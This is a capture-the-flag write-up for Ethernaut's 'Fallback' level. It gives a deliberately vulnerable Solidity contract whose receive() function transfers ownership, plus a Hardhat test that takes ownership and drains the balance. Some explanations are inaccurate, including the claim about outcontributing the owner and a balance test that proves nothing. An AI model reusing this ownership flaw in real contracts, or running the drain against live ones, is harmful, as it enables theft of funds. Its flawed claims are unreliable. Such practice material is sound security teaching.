# Level 1 : Fallback Contract

## Contract Explanation

``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}

```

### Contract Overview
The contract contains:
- A `mapping` that associates an address with its contribution in ethers.
- An `owner` who is the deployer of the contract. The owner is initially assigned 1000 ethers in the constructor.

### Key Functions
1. **Constructor:**
   - The contract assigns the deployer as the `owner`.
   - The owner is credited with a starting contribution of `1000 ether`.

2. **Modifier: `onlyOwner`:**
   - Ensures that only the contract `owner` can execute certain functions.

3. **Function: `contribute`:**
   - The function is `payable`, meaning it accepts ether contributions.
   - Contributions must be less than `0.001 ether`.
   - The `contributions` mapping is updated with the amount contributed.
   - If a user's contribution exceeds the owner's contribution, the ownership is transferred to the contributor.

4. **Function: `getContribution`:**
   - Returns the contribution of a particular user.

5. **Function: `withdraw`:**
   - Only the owner can withdraw the contract's balance.

6. **Fallback Function: `receive`:**
   - Changes the ownership of the contract if the contributor sends any ether and has made a contribution.

### Task
1. **Claim ownership of the contract.**
2. **Reduce the contract balance to zero.**

## Solution

### Hardhat Test Script

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Fallback contract", function () {
    let fallbackContract;
    let owner;
    let addr1;

    beforeEach(async function () {
        [owner, addr1, addr2] = await ethers.getSigners();
        const Fallback = await ethers.getContractFactory("Fallback");
        fallbackContract = await Fallback.deploy(); 
    });

    it("should set deployer as initial owner and contribution", async function () {
        expect(await fallbackContract.owner()).to.equal(owner.address);
        const initialContribution = await fallbackContract.contributions(owner.address);
        expect(initialContribution).to.equal(ethers.parseEther("1000"));
    });

    it("should allow contribution < 0.001 ether and update contributions", async function () {
        const value = ethers.parseEther("0.0005");
        await fallbackContract.connect(addr1).contribute({ value });
        const contribution = await fallbackContract.contributions(addr1.address);
        expect(contribution).to.equal(value);
    });

    it("should not allow contribution >= 0.001 ether", async function () {
        const value = ethers.parseEther("0.001");
        await expect(
            fallbackContract.connect(addr1).contribute({ value })
        ).to.be.reverted;
    });

    it("should change owner when contribution exceeds current owner's and fallback is triggered", async function () {
        const value = ethers.parseEther("0.0008");
        await fallbackContract.connect(addr1).contribute({ value });
        
        // Trigger fallback function
        await addr1.sendTransaction({
            to: fallbackContract.target,
            value: ethers.parseEther("0.0001"), 
        });

        await fallbackContract.connect(addr1).withdraw();

        // Verify new owner
        expect(await fallbackContract.owner()).to.equal(addr1.address);
    });

    it("should ensure contract balance is zero", async function() {
        let contractBalance = await ethers.provider.getBalance(fallbackContract);
        expect(contractBalance).to.be.eq("0");
    });
});
```
## Summary 
- The test successfully demonstrates the process of claiming ownership and reducing the contract's balance to zero.
- The owner of the contract can be changed if a user contributes more than the initial owner and triggers the fallback function.
- After ownership is transferred, the contract's balance is drained by the new owner.

## Github Repository 
- You can view and explore the code on my GitHub repository:
- [GitHub Link](https://github.com/0xC1ph3r-08/Ethernaut-Challenges/tree/main)